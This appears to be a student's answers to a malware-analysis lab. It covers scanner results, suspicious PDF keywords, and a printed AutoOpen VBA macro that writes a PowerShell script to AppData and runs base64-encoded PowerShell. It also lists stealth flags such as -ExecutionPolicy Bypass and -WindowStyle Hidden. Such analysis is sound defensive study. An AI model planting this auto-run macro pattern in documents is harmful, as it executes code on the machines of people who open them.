1)
A)

Yeah VirusTotal had identified the files before hand. I found malicious files with virustotal, and Yara found some rules. If the virus detector tool doesn't know that specific signature/pattern 
it tells the file is safe but in reality the virus detector lacks signatures/patterns. Signature-based identification works based on the known attacks, so if there is a new attack, it has different
signature and the signature-based identification doesn't think it's dangerous because it isn't 

My analysis is picture in the answers folder.

B) 
The worst thing you can do is allow it to execute macros.

C)
They have malicious JavaScript code and can execute it.

D)
Which files might seem to do something abnormal? What do they attempt to do on a general level? Are they executing some code? Include code. Include also the suspicious keywords of PDF.


Uncompatible.doc seems like the malicious .doc file.
It may read system variables, open a file, write to a while, run executable file, run PowerShell commands, includes
base64-encoded string, also there are links to  to executable files calc.exe and pwned.ps1.

Sub AutoOpen()
'
' AutoOpen Macro
'
'
secret = "echo 'Hahahaa! Your machine is under my control!'; echo 'Here, take a calc.'; & calc.exe;"
pwsh = CStr(Environ("AppData") & "\pwned.ps1")

Open pwsh For Output As #1
Print #1, secret
Close #1
base64_encoded = "QwA6AFwAVQBzAGUAcgBzAFwAbgBpAGsAbABhAFwAQQBwAHAARABhAHQAYQBcAFIAbwBhAG0AaQBuAGcAXABwAHcAbgBlAGQALgBwAHMAMQA="
Shell ("powershell -NoExit -EncodedCommand " & base64_encoded)
End Sub



Example.pdf seems like the malicious file with the references to JavaScript.
Suspicious references: /JS, /JavaScript, /openaction



2)
ClaimThePrice.doc:
Clamav didn't find anything in the file. Yara found macros in the file. Virustotal found viruses in the file.

The file contains functions like Private Sub Document_Open() and Private Function gjfYMikkAB(yBDgeveOCX As Variant, NbLNTBCNNM As Integer)
It also contains VBA MACRO ThisDocument.cls 

Shell commands etc:
-EncodedCommand, -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -NoExit -EncodedCommand

First it executed -encodedCommand, I tried to search what this means but couldn't find any information, perhaps the code was decoded 
so it was harder to detect is as a malware? ExecutionPolicy allows powershell to run scripts for the current process. NoProfile simply
such lauches script without profile, WindowsStyle hidden makes the malware more hidden because the powershell window doesnt pop up.
Noexit just means the window doesnt close as soon as the script is ended, but the window is hidden so I am not sure for what this command is.
There is the Open command and the file location so I think we can acquire the executable from there.